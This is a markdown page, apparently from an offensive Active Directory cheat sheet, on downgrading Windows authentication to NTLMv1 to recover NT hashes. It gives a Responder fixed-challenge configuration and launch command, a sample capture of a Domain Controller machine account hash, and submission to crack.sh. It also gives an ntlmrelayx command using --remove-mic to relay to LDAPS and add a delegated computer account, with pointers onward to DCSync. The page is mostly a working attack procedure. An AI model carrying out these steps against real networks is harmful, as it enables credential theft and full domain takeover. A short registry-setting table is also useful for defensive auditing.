**NTLMv1 authentication downgrade** — force a target (ideally a Domain Controller) to prove its identity using NTLMv1, an old challenge/response scheme so weak that its answer can be reversed straight back into the account's NT hash — the raw password hash Windows uses to log in. The trick is a fixed server challenge (`1122334455667788`): you set it in Responder so the target's response is computed against a value you already know, which lets crack.sh look the NT hash up in precomputed rainbow tables in minutes. From there you either use the hash directly, or relay the authentication elsewhere — NTLMv1 has no message integrity, so adding `--remove-mic` to ntlmrelayx lets you relay it even to a signing-required protocol like LDAP.

```
you set challenge 1122334455667788 in Responder
target --NTLMv1 resp = f(NT hash, fixed chal)--> you
you --submit resp--> crack.sh --rainbow table--> NT hash
```

## Background

The default NTLM version depends on the Windows version, but it can be set by GPO (`Network security: LAN Manager authentication level`), stored under `HKLM\System\CurrentControlSet\Control\Lsa`.

| Setting | Value |
| --- | :---: |
| Send LM & NTLM responses | 0 |
| Send LM & NTLM - use NTLMv2 session security if negotiated | 1 |
| Send NTLM response only (clients use NTLMv1) | 2 |
| Send NTLMv2 response only | 3 |
| Send NTLMv2 response only. Refuse LM | 4 |
| Send NTLMv2 response only. Refuse LM & NTLM | 5 |

Values 0-2 leave clients using NTLMv1 and are exploitable.

## Discovery

There is no easy remote way to determine the NTLM version other than testing (see Exploitation). Locally, query the registry:

```console

C:\Windows\System32>reg.exe query HKLM\System\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel
    LmCompatibilityLevel    REG_DWORD    0x3

```

## Exploitation

1. Edit Responder's `Responder.conf` to set `1122334455667788` as the fixed server challenge.

```txt

; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
;Challenge = Random
Challenge = 1122334455667788

```

2. Start Responder in analyze mode.

```bash

responder --lm -A -I INTERFACE

```

3. Coerce authentication over SMB - see [Coercing Authentication](Coercing%20Authentication.md).

Example capture:

```console

$ sudo responder --lm -A -I INTERFACE
[...]
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv1 Client   : 10.10.10.10
[SMB] NTLMv1 Username : DOMAIN\DC01$
[SMB] NTLMv1 Hash     : DC01$::DOMAIN:36D[...]6661:36D3[...]06661:1122334455667788

```

4. Submit the response at https://crack.sh/get-cracking/ to recover the NT hash.

Alternatively, since NTLMv1 does not support message integrity, the authentication can be relayed to another protocol even if signing is required (e.g. SMB to LDAP). Add `--remove-mic` to the ntlmrelayx command line:

```bash

ntlmrelayx.py -t 'ldaps://DC' --delegate-access --add-computer 'COMPUTER_NAME' -smb2support --remove-mic

```

5. Use the NT hash:
- Domain Controller: perform a DCSync - see [Dump NTDS.dit](../Credential%20Dumping/Dump%20NTDS.dit.md).
- Other machine targets: see [Computer Account to Local Admin](../Delegation%20Attacks/Computer%20Account%20to%20Local%20Admin.md).

## References

- Responder - https://github.com/lgandx/Responder
- Crack.sh - https://crack.sh/get-cracking/
- impacket - https://github.com/fortra/impacket
- NTLMv1 vs NTLMv2 - https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
